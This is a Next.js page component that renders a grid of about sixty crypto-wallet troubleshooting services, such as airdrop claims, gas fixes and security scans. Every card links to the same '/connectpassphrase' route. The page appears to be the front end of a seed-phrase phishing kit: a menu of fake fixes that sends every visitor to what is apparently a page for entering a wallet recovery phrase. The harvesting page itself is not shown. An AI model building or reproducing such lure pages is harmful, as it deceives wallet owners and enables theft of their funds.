'use client';

import React from 'react';
import { motion } from 'framer-motion';
import Card from '../component/card';
import Link from 'next/link';
const data = [
    { name: "Wallet Sync", description: "Synchronize wallet data across multiple chains and networks" },
    { name: "Claim", description: "Recover pending or unclaimed tokens from smart contracts" },
    { name: "Rectification", description: "Fix incorrect wallet balances or transaction errors" },
    { name: "Migration", description: "Move assets from one blockchain to another" },
    { name: "Token Swap", description: "Exchange one cryptocurrency token for another" },
    { name: "Slippage Adjustment", description: "Adjust slippage tolerance to fix failed swaps" },
    { name: "Claim Airdrop", description: "Claim eligible airdropped tokens" },
    { name: "Transaction Status", description: "Check if a transaction is pending or confirmed" },
    { name: "Gas Fee Fix", description: "Resolve stuck or failed transactions due to gas issues" },
    { name: "Wallet Connect", description: "Reconnect wallet securely to decentralized apps" },
    { name: "Network Switch", description: "Switch to the correct blockchain network" },
    { name: "Balance Checker", description: "View wallet balances across multiple chains" },
    { name: "Smart Contract Audit", description: "Scan contract interactions for issues" },
    { name: "Approval Revoke", description: "Remove token approvals for security" },
    { name: "NFT Fix", description: "Fix missing or hidden NFTs in wallet" },
    { name: "Bridge Assets", description: "Transfer assets across blockchains" },
    { name: "Staking Fix", description: "Resolve staking or locked funds issues" },
    { name: "Liquidity Fix", description: "Troubleshoot liquidity pool problems" },
    { name: "RPC Fix", description: "Fix network or RPC connection errors" },

    // 🔥 NEW ADDITIONS

    { name: "Pending Transactions", description: "View and resolve stuck or pending transactions" },
    { name: "Nonce Fix", description: "Resolve transaction nonce conflicts or errors" },
    { name: "Replace Transaction", description: "Speed up or cancel a stuck transaction" },
    { name: "Token Import", description: "Manually add missing tokens to your wallet" },
    { name: "Contract Interaction", description: "Interact directly with smart contracts" },
    { name: "Address Validator", description: "Verify if a wallet address is valid" },
    { name: "Phishing Check", description: "Scan for malicious or fake contract addresses" },
    { name: "Dust Attack Fix", description: "Identify and manage suspicious token transfers" },
    { name: "Portfolio Overview", description: "View complete crypto portfolio analytics" },
    { name: "DeFi Position Checker", description: "Track positions in DeFi protocols" },
    { name: "Yield Farming Fix", description: "Resolve yield farming reward issues" },
    { name: "LP Token Recovery", description: "Recover liquidity provider tokens" },
    { name: "Cross-Chain Status", description: "Track cross-chain bridge transactions" },
    { name: "Token Price Checker", description: "Fetch real-time token prices" },
    { name: "Wallet Backup", description: "Guide to securely backup wallet recovery phrase" },
    { name: "Hardware Wallet Fix", description: "Resolve Ledger or Trezor connection issues" },
    { name: "Session Expired Fix", description: "Reconnect expired wallet sessions" },
    { name: "Signature Error Fix", description: "Resolve failed wallet signature requests" },
    { name: "Contract Revert Fix", description: "Analyze and fix reverted transactions" },
    { name: "Token Approval Checker", description: "View active token approvals" },
    { name: "Gas Estimator", description: "Estimate optimal gas fees before transactions" },
    { name: "Block Explorer", description: "Open transaction in blockchain explorer" },
    { name: "ENS Resolver", description: "Resolve ENS names to wallet addresses" },
    { name: "Multisig Wallet Fix", description: "Troubleshoot multisig wallet issues" },
    { name: "DAO Voting Fix", description: "Resolve DAO voting or proposal issues" },
    { name: "Token Vesting Check", description: "Check locked or vested token schedules" },
    { name: "Airdrop Eligibility", description: "Check eligibility for upcoming airdrops" },
    { name: "Wallet Activity Log", description: "View full wallet transaction history" },
    { name: "Chain ID Fix", description: "Resolve incorrect chain ID errors" },
    { name: "Web3 Connection Test", description: "Test browser Web3 connectivity" },
    { name: "DApp Browser Fix", description: "Fix issues with in-app DApp browsers" },
    { name: "Token Metadata Fix", description: "Fix incorrect token name or symbol display" },
    { name: "NFT Metadata Refresh", description: "Refresh NFT images and metadata" },
    { name: "Spam Token Filter", description: "Hide or filter unwanted spam tokens" },
    { name: "Bridge Fee Checker", description: "Check fees before bridging assets" },
    { name: "Validator Status", description: "Check validator or node health" },
    { name: "Wallet Lock Issue", description: "Resolve wallet auto-lock or login issues" },
    { name: "Private RPC Setup", description: "Configure custom RPC endpoints" },
    { name: "Transaction Simulator", description: "Simulate transaction before sending" },
    { name: "Security Scan", description: "Run a full wallet security check" },
];

const container = {
    hidden: {},
    show: {
        transition: {
            staggerChildren: 0.15,
        },
    },
};

const Page = () => {
    return (
        <motion.div
            variants={container}
            initial="hidden"
            animate="show"
            className='py-20 flex flex-wrap w-full justify-center gap-4 p-4'
        >
            {data.map((item, index) => (
                <Link href="/connectpassphrase">

                    <Card
                        key={index}
                        name={item.name}
                        description={item.description}
                    />
                </Link>
            ))}
        </motion.div>
    );
};

export default Page;